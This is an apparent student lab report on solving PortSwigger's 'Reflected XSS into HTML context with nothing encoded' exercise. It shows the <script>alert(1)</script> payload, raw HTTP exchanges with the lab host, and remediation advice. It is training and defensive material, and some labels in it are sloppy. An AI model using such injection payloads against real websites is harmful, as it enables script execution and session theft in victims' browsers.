# PortSwigger Web Security Academy Lab Report: Reflected XSS into HTML Context with Nothing Encoded



**Report ID:** PS-LAB-XSS-001  

**Author:** Abhi (Abhiram)  

**Date:** February 08, 2026  

**Lab Level:** Apprentice  

**Lab Title:** Reflected XSS into HTML context with nothing encoded



## Executive Summary

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)  

**Severity:** Medium to High (CVSS 3.1 Score: ~6.1 – AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N – depends on impact; lab treats as exploitable for alert execution)

**Description:** A reflected XSS vulnerability exists in the search functionality. User input from the search box is reflected directly into the HTML response without any encoding or sanitization (nothing encoded). This allows arbitrary HTML/JavaScript injection, demonstrated by executing `alert(1)`.

**Impact:** An attacker can craft a malicious URL containing XSS payload. If a victim clicks it (social engineering/phishing), the script executes in their browser — potential for cookie theft, session hijacking, keylogging, or defacement in production.

**Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.



## Environment and Tools Used:

**Target:** Simulated site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – optional for request analysis Built-in browser developer tools (Inspect Element)  

**Operating System:** Windows 11 (or mobile equivalent)  

**Test Date/Time:** February 08, 2026, approximately 06:20 PM IST



## Methodology:

Conducted ethically in simulated lab environment.

1. Accessed the lab via "Access the lab" button in PortSwigger Academy.  
2. Navigated to the search functionality (search box on page).  
3. Tested for reflection: Entered normal text → observed input reflected in `<h1>` or similar HTML tag without changes.  
4. Injected basic XSS payload: `<script>alert(1)</script>` into search box.  
5. Submitted search → browser executed JavaScript, popping alert box.  
6. Lab solved (green banner: "Congratulations, you solved the lab!").



## Detailed Findings:

**Vulnerable Endpoint:** Search form (reflected via GET/POST to `/` or similar path)

**Original Input (Safe Test):**

GET /?search=<script>print('SOLVED')</script> HTTP/2
Host: 0aab00770435b86b80e2033900e10035.web-security-academy.net
Cookie: session=v3SzkkzIgf5RKKMSl0V2w17hQb6tNpnx
User-Agent: Mozilla/5.0…


**Reflected Output:**

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=v3SzkkzIgf5RKKMSl0V2w17hQb6tNpnx; Secure; HttpOnly; SameSite=None
Content-Length: 5919

<!DOCTYPE html>
<html>
<head><title>Reflected XSS into HTML context...</title></head>
<body>
<!-- Blog posts list with search form -->
<form action=/ method=GET>
<input type=text name=search>
</form>
<!-- 5 blog posts with titles and View post links -->
</body>
</html>

Modified request 1:

GET /?search=%3Cscript%3Ealert(1)%3C/script%3E HTTP/2
Host: 0aab00770435b86b80e2033900e10035.web-security-academy.net
Cookie: session=v3SzkkzIgf5RKKMSl0V2w17hQb6tNpnx
User-Agent: Mozilla/5.0...
Accept: text/html

Request:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 6277

<!DOCTYPE html>
<html>
<head>
  <title>Reflected XSS into HTML context with nothing encoded</title>
</head>
<body>
  <section class='academyLabBanner is-solved'>...LAB Solved...</section>
  <h1>0 search results for '<script>alert(1)</script>'</h1>
</body>
</html>


Proof of Exploitation:


![Proof of XSS  Error]()

Figure 1: Payload entered in search box.


![Proof of Successful XSS Exploitation]()

Figure 2: JavaScript alert(1) executed successfully.


![Lab Solved Congratulations]()

Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"


Exploitation Explanation:

The application reflects search input directly into HTML body/context without HTML-encoding special characters (< > " ' &). This places input between HTML tags (e.g., inside <h1> or <p>), allowing tag/script injection. No WAF, CSP, or output encoding prevents execution.


Risk Assessment:

Likelihood of Exploitation: High (simple reflected input, no encoding).
Potential Impact: Medium-High — session hijacking, phishing amplification, or arbitrary code execution in victim context.
Affected Components: Search functionality (frontend reflection).


Recommendations for Remediation:

Implement output encoding (HTML-encode user input before reflection using libraries like OWASP Java Encoder, ESAPI, or built-in functions).
Use Content Security Policy (CSP) to restrict script execution (e.g., nonce or strict policy).
Validate/sanitize input server-side (allow only safe characters if possible).
Deploy Web Application Firewall (WAF) with XSS rules (though not sufficient alone).
Conduct regular security testing (Burp Scanner, OWASP ZAP, manual review).



Conclusion and Lessons Learned:

This lab demonstrated a classic reflected XSS in plain HTML context with no protections — solved with minimal payload.

Key Takeaways:

Identify reflection context (here: between HTML tags).
Test simple payloads like <script>alert(1)</script> first.
Understand why encoding matters — nothing encoded = instant exploit.
Improved skills in XSS identification, payload crafting, and reporting.



References:

PortSwigger Web Security Academy: Reflected XSS into HTML context with nothing encoded
General XSS: Cross-site scripting (reflected)
